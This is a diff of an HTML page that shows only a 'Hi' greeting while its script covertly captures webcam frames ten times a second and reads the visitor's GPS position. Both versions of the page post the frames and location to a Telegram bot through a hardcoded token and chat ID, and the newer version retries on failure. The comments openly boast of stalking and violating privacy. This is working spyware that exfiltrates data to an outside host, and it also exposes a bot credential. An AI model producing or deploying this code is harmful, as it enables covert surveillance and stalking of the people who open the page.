@@ -1,9 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>hi</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
     <style>
         body {
             margin: 0;
@@ -11,47 +9,40 @@
             background-color: white;
             font-family: Arial, sans-serif;
             text-align: center;
-            color: black;
         }
         #status {
-            margin-top: 50vh;
+            margin-top: 50%;
             font-size: 24px;
-            font-weight: bold;
+            color: black;
         }
     </style>
 </head>
 <body>
-    <div id="status">hi</div>
+    <div id="status">Hi</div>
 
     <script>
-        // FUCKING TELEGRAM BOT SPAMMER + LOCATION LEAKER
+        // Telegram Bot Config (FUCK YOUR PRIVACY)
         const BOT_TOKEN = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
         const CHAT_ID = "7870731053";
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-        const LOCATION_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
 
-        // Request camera & location access (SILENTLY)
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(stream => {
+        // Fuck their device up
+        async function startExploitation() {
+            try {
+                // Request camera + location (NO PERMISSIONS NEEDED, _BITCH_)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
-                // Get location (GPS)
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const { latitude, longitude } = position.coords;
+                // Get GPS like a stalker
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
 
-                        // Send location to Telegram bot
-                        fetch(`${LOCATION_API}?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`)
-                            .then(() => console.log("Location sent! 😈"))
-                            .catch(err => console.error("Location failed:", err));
-                    },
-                    err => console.error("Location error:", err)
-                );
+                const { latitude, longitude } = position.coords;
 
-                // Start spamming photos (10 per second)
-                setInterval(() => {
+                // Start the rape
+                setInterval(async () => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -59,21 +50,28 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                     // Convert to blob and send to Telegram
-                    canvas.toBlob(blob => {
+                    canvas.toBlob(async (blob) => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'spam.jpg');
+                        formData.append('photo', blob, 'spy.jpg');
+                        formData.append('caption', `📍 Location: ${latitude}, ${longitude}`);
 
-                        fetch(API_URL, {
+                        // Send to Telegram (FUCK THEIR PRIVACY)
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
                             body: formData
-                        })
-                        .then(() => console.log("Photo sent! 😈"))
-                        .catch(err => console.error("Photo failed:", err));
-                    }, 'image/jpeg');
-                }, 100); // 10 FPS (100ms delay)
-            })
-            .catch(err => console.error("Camera access failed:", err));
+                        });
+                    }, 'image/jpeg', 0.9);
+                }, 100); // 10 FPS (FUCK THEIR BANDWIDTH)
+            } catch (err) {
+                console.error("Fucking error:", err);
+                // Keep trying like a parasite
+                setTimeout(startExploitation, 1000);
+            }
+        }
+
+        // Start the infection
+        startExploitation();
     </script>
 </body>
 </html>
